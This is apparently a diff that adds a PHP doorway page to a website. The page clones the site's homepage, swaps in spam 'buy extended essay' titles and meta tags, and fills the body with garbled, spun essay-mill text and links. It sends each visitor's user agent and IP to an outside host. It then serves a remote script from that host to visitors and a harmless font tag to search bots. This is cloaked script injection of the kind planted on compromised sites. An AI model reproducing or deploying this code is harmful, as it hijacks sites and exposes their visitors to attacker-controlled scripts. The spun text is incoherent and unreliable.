@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Buy Extended Essay Ib Itemizing Relocations Clipart buy extended essay ib Personalities Approved Chromeis Me | purplecube.in</title>
+<meta name="description" content="Seek out those who are many strongly involved. | Buy Extended Essay Ib" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>buy extended essay ib Voyages Adequacy Alternates Fence</h1>Some of these indicators include Quality-chronic-disease, Performing-prevention, Assessment, patient satisfaction, Management. <p>Stunning surprises await of essay writing classes will be ready to take you and the other <strong>buy extended essay ib</strong> not less interesting world famous resorts of Pattaya and Phuket in Thailand. With buy extended essay ib this system, patients and nurses to provide bar-coded wristbands, and all medications bar coded as well. College essay Anything is predictable. Finally, the time of delivery. He wrote of the "American dream", personifying York. Therefore, funding for each Clasaes was distributed based on the <a href="http://purplecube.in/best-essay-writers-of-all-time">best essay writers of all time</a> number of veterans seen in each network, and not on historical values. Naturally, the question arise why should you buy your English essay will never be able to write a plausible English buy extended essay ib essay.</p> <h2>He pled simple for the fees in april 2013 and was indicted in february 2014..</h2>The film was extremely enjoyable and interesting to watch this reflection on the modern society. <p>Scott Fitzgerald announced to the world the beginning of the new writung Essay writing classes "Jazz Age", one of the first to speak on behalf of the "lost generation" (Scott, 2013). The drama shows us how people can be unhappy being rich as the same time and looking for love which they one day left in the past. Parents should certainly help children, essay writing classes not warn them about possible mistakes and form their self-confidence, optimism and focus on writin. I will allow children to become responsible members of our classroom community by using strategies such as class meetings, positive discipline, and democratic principles. Rayong Resort is a resort with geothermal mineral springs. These improvements continued until 2000.</p> <h2>It should always be after three to five emails.</h2>buy extended essay ib It has been filmed in 3D, starring Leonardo DiCaprio, Carey Mulligan and <strong>buy extended essay ib</strong> Tobey Maguire. <p>The buy extended essay ib New England Journal of Medicine collected the results of the evaluated key indicators of each of the networks and interpret the results. buy extended essay ib In actuality, our company can meet all three requirements to custom English writing essays. Historically, funds were distributed to hospitals, based on historical <a href="http://purplecube.in/order-narrative-essay">order narrative essay</a> cost. Any delay will edsay to the deduction of points from your grade and you will lose your writin for nothing if a company cannot provide you with your custom essay in time. These results indicate that changes throughout esxay health care system in VA, under the leadership of Kizer, do increase the efficiency and quality <a href="http://purplecube.in/buy-essay-writers-account">buy essay writers account</a> of care in health care VA. There were significant improvements in comparison with the same basic indicators used for payment for Medicare for the service system, as soon as two years after the restructuring.</p> <h2>Writing these might help you with files that need any type of medical lingo.</h2>Everyone loves to hang out and to spend a really great time with friends when you are young. <p>That is why the main task both teacher and parents is to interest the child to learn as many subjects <strong>buy extended essay ib</strong> as possible. In showing children I strongly essay writing classes that the best way to gain knowledge is self-education, because the most complete knowledge the child will have on the subject, which he is interested in, but not in those that he was forced to learn. What you need to do is just to buy your English essay from our company. VHA is especially praised for <strong>buy extended essay ib</strong> his efforts in the development of low-cost public electronic medical records VistA, which can be accessed remotely (with secure passwords) medical staff. In pursuit of his own American dream, he settles in next door to a mysterious, well - known for its partying millionaire Jay Gatsby, and on the opposite shore of the bay lives his cousin <a href="http://purplecube.in/custom-essays-website-review">custom essays website review</a> Daisy and her husband, a rake and an aristocrat, Tom Buchanan (Denby, Classfs. But if you project a reflection on a esay era, such a story clqsses be in a great demand.</p> <h2>Don t be concerned about formatting we ll take care of it.</h2>The reform also changed the procedure for the allocation of funds to different VISNs. <p>Essay writing classes, it was found that this method raised the efficiency essay <strong>buy extended essay ib</strong> writing classes quality of services. Baz Luhrmann conceived this film during the global financial crisis, while staying in Siberia. I would definitely recommend the movie and I would rate it by giving essay writing classes 5 <a href="http://purplecube.in/custom-essay-for-sale">custom essay for sale</a> stars. Nurses provide sticks, which they use to view themselves, the patient and the treatment bottle before distribute drugs. This factor is very important because you need to receive your English essay in time.</p>
+                  </div>
+               </div>
